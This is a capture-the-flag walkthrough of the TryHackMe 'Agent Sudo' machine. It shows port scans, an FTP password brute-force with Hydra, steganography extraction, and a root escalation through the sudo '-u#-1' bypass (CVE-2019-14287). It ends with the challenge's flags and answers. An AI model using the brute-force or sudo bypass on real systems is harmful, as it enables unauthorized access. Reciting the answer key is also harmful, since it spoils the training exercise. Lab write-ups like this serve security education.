


## NMAP SCAN

```
Nmap 7.60 scan initiated Fri Jul  9 17:17:37 2021 as: nmap -sC -sV -oN nmap.txt 10.10.91.22

Nmap scan report for ip-10-10-91-22.eu-west-1.compute.internal (10.10.91.22)
Host is up (0.046s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
MAC Address: 02:E5:84:3F:11:AB (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done at Fri Jul  9 17:17:56 2021 -- 1 IP address (1 host up) scanned in 19.03 seconds
```

## NIKTO SCAN
```
- Nikto v2.1.5/2.1.5
+ Target Host: ip-10-10-91-22.eu-west-1.compute.internal
+ Target Port: 80
+ GET /: The anti-clickjacking X-Frame-Options header is not present.
+ DEBUG HASH(0x55d3214d89f8): DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ GET /icons/README: Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+ -3233: GET /icons/README: /icons/README: Apache default file found.
```

## GOBUSTER SCAN

```
/server-status (Status: 403)
```

## CURL

```
$ curl -A "C" -L http://10.10.91.22
Attention chris, <br><br>Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>From,<br>
Agent R
```

## FTP BRUTE WITH HYDRA

```
Hydra v8.6 run at 2021-07-10 07:11:34 on 10.10.29.171 ftp (hydra -l chris -P /usr/share/wordlists/rockyou.txt -o Desktop/ftp-brute.txt ftp://10.10.29.171)
[21][ftp] host: 10.10.29.171   login: chris   password: crystal



```

## STEGHIDE

```
root@ip-10-10-95-116:~/Desktop# steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".

root@ip-10-10-95-116:~/Desktop# cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris


```

## USER.TXT

```
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```

## PRIVILEDGE ESCLATION

```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

james@agent-sudo:~$ sudo su
Sorry, user james is not allowed to execute '/bin/su' as root on agent-sudo.

james@agent-sudo:~$ sudo -u#-1 /bin/bash -i
Alien_autospy.jpg  user_flag.txt

root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt

root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root# 


```

## ANSWERS

### TASK 2: Enumerate

```
1. How many open ports?
Ans: 3

2. How you redirect yourself to a secret page?
Ans: User-Agent

3. What is the agent name?
Ans: chris
```

### TASK 3: Hash cracking and brute-force 

```
1. FTP password
Ans: crystal

2. Zip file password
Ans: alien

3. steg password
Ans: Area51

4. Who is the other agent (in full name)?
Ans: james

5. SSH password
Ans: hackerrules!

```

### TASK 4: Capture the user flag 

```
1. What is the user flag?
Ans: b03d975e8c92a7c04146cfa7a5a313c7

2. What is the incident of the photo called?
Ans: roswell alien autopsy

```

### TASK 5: Privilege escalation

```bash

1. CVE number for the escalation 
Ans: CVE-2019-14287

2. What is the root flag?
Ans: b53a02f55b57d4439e3341834d70c062

3. (Bonus) Who is Agent R?
Ans: DesKel

```




